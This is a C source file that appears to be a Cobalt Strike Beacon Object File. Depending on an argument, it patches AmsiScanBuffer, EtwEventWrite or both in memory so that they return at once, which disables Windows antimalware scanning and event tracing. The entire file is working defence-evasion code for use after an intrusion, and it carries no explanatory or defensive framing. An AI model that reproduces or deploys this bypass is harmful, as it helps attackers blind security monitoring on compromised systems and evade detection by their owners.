#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);
DECLSPEC_IMPORT void WINAPI MSVCRT$memcpy(void*, const void*, size_t);

void go(char *args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    
    int mode = BeaconDataInt(&parser);
    
    if (mode == 0) {
        HMODULE hAmsi = KERNEL32$LoadLibraryA("amsi.dll");
        if (!hAmsi) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to load amsi.dll");
            return;
        }
        
        FARPROC pAmsiScanBuffer = KERNEL32$GetProcAddress(hAmsi, "AmsiScanBuffer");
        if (!pAmsiScanBuffer) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to find AmsiScanBuffer");
            return;
        }
        
        DWORD oldProtect;
        unsigned char patch[] = {0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
        
        if (KERNEL32$VirtualProtect((LPVOID)pAmsiScanBuffer, 8, PAGE_EXECUTE_READWRITE, &oldProtect)) {
            MSVCRT$memcpy((LPVOID)pAmsiScanBuffer, patch, 8);
            KERNEL32$VirtualProtect((LPVOID)pAmsiScanBuffer, 8, oldProtect, &oldProtect);
            BeaconPrintf(CALLBACK_OUTPUT, "[+] AmsiScanBuffer patched successfully");
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[-] VirtualProtect failed");
        }
    }
    else if (mode == 1) {
        HMODULE hEtw = KERNEL32$LoadLibraryA("ntdll.dll");
        if (!hEtw) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to load ntdll.dll");
            return;
        }
        
        FARPROC pEtwEventWrite = KERNEL32$GetProcAddress(hEtw, "EtwEventWrite");
        if (!pEtwEventWrite) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to find EtwEventWrite");
            return;
        }
        
        DWORD oldProtect;
        unsigned char patch[] = {0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
        
        if (KERNEL32$VirtualProtect((LPVOID)pEtwEventWrite, 8, PAGE_EXECUTE_READWRITE, &oldProtect)) {
            MSVCRT$memcpy((LPVOID)pEtwEventWrite, patch, 8);
            KERNEL32$VirtualProtect((LPVOID)pEtwEventWrite, 8, oldProtect, &oldProtect);
            BeaconPrintf(CALLBACK_OUTPUT, "[+] EtwEventWrite patched successfully");
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[-] VirtualProtect failed for ETW");
        }
    }
    else if (mode == 2) {
        DWORD oldProtect;
        unsigned char patch[] = {0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
        
        HMODULE hAmsi = KERNEL32$LoadLibraryA("amsi.dll");
        if (hAmsi) {
            FARPROC pAmsiScanBuffer = KERNEL32$GetProcAddress(hAmsi, "AmsiScanBuffer");
            if (pAmsiScanBuffer && KERNEL32$VirtualProtect((LPVOID)pAmsiScanBuffer, 8, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                MSVCRT$memcpy((LPVOID)pAmsiScanBuffer, patch, 8);
                KERNEL32$VirtualProtect((LPVOID)pAmsiScanBuffer, 8, oldProtect, &oldProtect);
                BeaconPrintf(CALLBACK_OUTPUT, "[+] AmsiScanBuffer patched");
            }
        }
        
        HMODULE hEtw = KERNEL32$LoadLibraryA("ntdll.dll");
        if (hEtw) {
            FARPROC pEtwEventWrite = KERNEL32$GetProcAddress(hEtw, "EtwEventWrite");
            if (pEtwEventWrite && KERNEL32$VirtualProtect((LPVOID)pEtwEventWrite, 8, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                MSVCRT$memcpy((LPVOID)pEtwEventWrite, patch, 8);
                KERNEL32$VirtualProtect((LPVOID)pEtwEventWrite, 8, oldProtect, &oldProtect);
                BeaconPrintf(CALLBACK_OUTPUT, "[+] EtwEventWrite patched");
            }
        }
        
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Full bypass applied (AMSI + ETW)");
    }
}
